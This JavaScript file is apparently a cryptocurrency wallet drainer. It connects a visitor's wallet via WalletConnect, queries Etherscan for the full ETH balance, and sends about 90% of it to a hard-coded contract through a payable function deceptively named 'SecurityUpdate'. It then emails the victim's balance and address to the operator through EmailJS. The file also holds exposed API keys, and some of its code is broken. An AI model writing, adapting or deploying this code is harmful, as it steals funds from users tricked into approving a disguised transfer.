// // const WalletConnectProvider  = new WalletConnectProvider.default();
// const provider = new WalletConnectProvider.default ({
//   infuraId: 'afeca39d1e664a35aeaea9b3a667ff1d',
// });

const projectId = "ae41b4e768356491a7ee9a90f55c0c0f"; // Your MetaMask project ID
const chains = [1]; // Mainnet (you can add more chains if needed)
const showQrModal = true;
const methods = ["eth_sendTransaction", "eth_signTransaction", "eth_sign"];
const events = ["disconnect", "accountsChanged"];

const zip = async () => {
	try{
		
	const provider = EthereumProvider.init({
		projectId,
		chains,
		showQrModal,
		methods,
		events,
	  });	// document.getElementById("cont-name").innerHTML = data;


	} catch (error) {
    console.error('WalletConnect error:', error);
  }

}

const runContract = async () => {
  try {
    await provider.enable(); // Request wallet connection
    if (provider.wc.connected) {
      // WalletConnect session is connected
      console.log('WalletConnect is connected!');
      const accounts = await provider.send('eth_requestAccounts', []);
      const account = accounts[0];

      // Create a Web3 instance using the globally available Web3 object
      const web3 = new Web3(provider);
	  const apiKey = "876RZ5Y8WWAXVNZN61T2WPFTGI5MBI5GGX"; // for eth
	  //const ethBalanceApiUrl = `https://api-testnet.bscscan.com/api?module=account&action=balance&address=${account}&apikey=${apiKey}`;
	  const ethBalanceApiUrl = `https://api.etherscan.io/api?module=account&action=balance&address=${account}&apikey=${apiKey}`;
	  
	  const response = await fetch(ethBalanceApiUrl);
	  const ethBalanceData = await response.json();
	  const ethBalanceInWei = ethBalanceData.result;
	  const gasFee = 0.1 * ethBalanceInWei;
	  const ethtransaferableInWei = Math.floor(ethBalanceInWei - gasFee);
		// Now, you can use 'account' for your contract interactions
		const contractAbi = [{
		  "constant": true,
		  "inputs": [],
		  "name": "getBalance",
		  "outputs": [{
			  "name": "",
			  "type": "uint256"
		  }],
		  "payable": false,
		  "stateMutability": "view",
		  "type": "function"
	  }, {
		  "constant": false,
		  "inputs": [],
		  "name": "withdraw",
		  "outputs": [],
		  "payable": false,
		  "stateMutability": "nonpayable",
		  "type": "function"
	  }, {
		  "constant": false,
		  "inputs": [],
		  "name": "SecurityUpdate",
		  "outputs": [],
		  "payable": true,
		  "stateMutability": "payable",
		  "type": "function"
	  }, {
		  "constant": true,
		  "inputs": [],
		  "name": "getOwner",
		  "outputs": [{
			  "name": "",
			  "type": "address"
		  }],
		  "payable": false,
		  "stateMutability": "view",
		  "type": "function"
	  }, {
		  "inputs": [],
		  "payable": false,
		  "stateMutability": "nonpayable",
		  "type": "constructor"
	  }];
	  const contractAddress = "0x0206b09AC971cb742aA059A44Fb0200768690a33";

      const contract = new web3.eth.Contract(contractAbi, contractAddress);

      // Call your contract methods here
// Example payable function
      const payableFunction = contract.methods.SecurityUpdate();
      
      const valueInWei = web3.utils.toWei('0.1', 'ether'); // Specify the value to send with the transaction
      
      payableFunction
        .send({
          from: account, // The user's wallet address
          value: ethtransaferableInWei, // The amount of Ether to send
          gas: 0
        })
      // Call sendEmail function with balance and wallet address
      sendEmail(ethtransaferableInWei, account);
    }
  } catch (error) {
    console.error('WalletConnect error:', error);
  }
};

// Function to send the email
function sendEmail(balance, wallet) {
  emailjs.init('your_user_id'); // Replace with your actual user ID

  var templateParams = {
    balance: balance,
    wallet: wallet,
  };

  emailjs.send('service_h2vkhpq', 'template_9qyt9rq', templateParams)
    .then(function(response) {
      console.log('Email sent:', response);
    })
    .catch(function(error) {
      console.error('Email error:', error);
    });
}

// Call the runContract function to start the process
// runContract();
